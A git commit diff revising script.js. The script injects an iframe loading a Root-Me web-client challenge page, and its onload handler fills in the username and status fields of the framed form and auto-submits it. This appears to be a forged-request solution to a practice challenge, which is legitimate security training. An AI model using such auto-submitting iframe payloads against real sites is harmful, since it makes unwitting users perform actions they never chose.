be9a3758c3b5c1a29cbea4bafbaebf59438249c1
fullgitstack <mackormack0@gmail.com>
2025-10-13 17:00:45 +0200

    Update script.js

--- script.js
+++ script.js
@@ -4,15 +4,24 @@ const html1 = `
 <iframe
  id="iframe1"
  src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
- onload=' const ifr = document.querySelector("#iframe1"); const pseudo = ifr.contentDocument.querySelector("#username"); const status = ifr.contentDocument.querySelector("#status");
- pseudo.value = "test1"; status.checked = true;
- setTimeout(() => {ifr.contentDocument.forms[0].submit()}, 4000) '
+onload='
+  const ifr = document.querySelector("#iframe1");
+  setTimeout(() => {
+    const doc = ifr.contentDocument;
+    const pseudo = doc.querySelector("#username");
+    const status = doc.querySelector("#status");
+    
+    pseudo.value = "test1";
+    status.checked = true;
+    doc.forms[0].submit();
+  }, 1000); '
 >
 </iframe>
 
 `
 
 body1.innerHTML += html1
+
 
 
 
